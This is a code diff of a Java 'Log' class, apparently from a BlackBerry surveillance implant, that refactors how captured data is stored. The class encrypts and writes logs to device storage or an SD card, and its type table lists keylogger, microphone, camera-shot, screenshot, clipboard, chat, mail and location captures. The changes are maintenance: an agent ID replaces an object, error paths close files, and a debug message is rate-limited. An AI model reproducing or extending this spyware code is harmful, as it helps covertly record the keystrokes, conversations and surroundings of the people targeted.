@@ -70,15 +70,15 @@ public final class Log {
 
     public static final int LOG_MAGIC_CALLTYPE = 0x0026;
 
-    public static final int[] TYPE_LOG = new int[] { LogType.UNKNOWN,
+    public static final int[] TYPE_LOG = new int[] { LogType.INFO,
             LogType.MAIL_RAW, LogType.TASK,
             LogType.CALLLIST, // 0..3
             LogType.DEVICE, LogType.LOCATION, LogType.CALL,
             LogType.CALL_MOBILE, // 4..7
             LogType.KEYLOG, LogType.SNAPSHOT, LogType.URL, LogType.CHAT, // 8..b
             LogType.MAIL, LogType.MIC, LogType.CAMSHOT, LogType.CLIPBOARD, // c..f
-            LogType.UNKNOWN, LogType.APPLICATION, // 10..11
-            LogType.UNKNOWN  // 12
+            LogType.NONE, LogType.APPLICATION, // 10..11
+            LogType.NONE // 12
     };
 
     private static final long MIN_AVAILABLE_SIZE = 200 * 1024;
@@ -88,6 +88,8 @@ public final class Log {
 
     //#endif
 
+    boolean firstSpace = true;
+    
     /**
      * Convert type log.
      * 
@@ -100,7 +102,7 @@ public final class Log {
         //#ifdef DBC
         Check.requires(TYPE_LOG != null, "Null TypeLog");
         //#endif
-        if (agentPos > 0 && agentPos < TYPE_LOG.length) {
+        if (agentPos >= 0 && agentPos < TYPE_LOG.length) {
             final int typeLog = TYPE_LOG[agentPos];
             return typeLog;
         }
@@ -126,7 +128,9 @@ public final class Log {
     LogDescription logDescription;
     Device device;
 
-    Agent agent;
+    //Agent agent;
+    int agentId;
+    boolean onSD;
 
     int progressive;
 
@@ -146,43 +150,23 @@ public final class Log {
      * @param aesKey
      *            the aes key
      */
-    public Log(final Agent agent_, final byte[] aesKey) {
+    public Log(final int agentId, final boolean onSD, final byte[] aesKey) {
         this();
-        //#ifdef DBC
-        Check.ensures(agent_ != null, "createLog: agent null");
+        //#ifdef DBC        
         Check.requires(aesKey != null, "createLog: aesKey null");
         Check.requires(encryption != null, "createLog: encryption null");
         //#endif
 
-        agent = agent_;
+        //agent = agent_;
+        this.agentId = agentId;
+        this.onSD = onSD;
+
         encryption.makeKey(aesKey);
 
         //#ifdef DBC
-        Check.ensures(agent != null, "createLog: agent null");
+        //Check.ensures(agent != null, "createLog: agent null");
         Check.ensures(encryption != null, "createLog: encryption null");
         //#endif
-    }
-
-    /**
-     * Instantiates a new log.
-     * 
-     * @param agent_
-     *            the agent_
-     * @param aesKey
-     *            the aes key
-     */
-    public Log(final Agent agent_, final String aesKey) {
-        this();
-        //#ifdef DBC
-        Check.requires(agent != null, "createLog: agent null");
-        Check.requires(aesKey != null, "createLog: aesKey null");
-        //#endif
-        agent = agent_;
-
-        final byte[] key = new byte[16];
-        Utils.copy(key, 0, aesKey.getBytes(), 0, 16);
-
-        encryption.makeKey(key);
     }
 
     /**
@@ -220,9 +204,9 @@ public final class Log {
 
     public synchronized boolean createLog(final byte[] additionalData) {
         //#ifdef DBC
-        Check.requires(agent != null, "createLog: agent null");
+        //Check.requires(agent != null, "createLog: agent null");
         //#endif
-        return createLog(additionalData, convertTypeLog(agent.agentId));
+        return createLog(additionalData, convertTypeLog(agentId));
     }
 
     /**
@@ -259,7 +243,7 @@ public final class Log {
             additionalLen = additionalData.length;
         }
 
-        final Vector tuple = logCollector.makeNewName(this, agent);
+        final Vector tuple = logCollector.makeNewName(this, onSD);
         //#ifdef DBC
         Check.asserts(tuple.size() == 5, "Wrong tuple size");
         //#endif
@@ -295,21 +279,28 @@ public final class Log {
             fconn = (FileConnection) Connector.open(fileName);
 
             if (fconn.exists()) {
+                close();
                 //#ifdef DEBUG
                 debug.fatal("It should not exist:" + fileName);
                 //#endif
+
                 return false;
             }
 
             long available = fconn.availableSize();
             if (available < MIN_AVAILABLE_SIZE) {
+                close();
                 //#ifdef DEBUG
-                debug.fatal("not enough space: " + available);
+                if (firstSpace) {
+                    firstSpace = false;
+
+                    debug.fatal("not enough space: " + available);
+                }
                 //#endif
+
                 return false;
             }
 
-           
             //#ifdef DEBUG_INFO
             debug.info("Created: " + fileName);
             //#endif
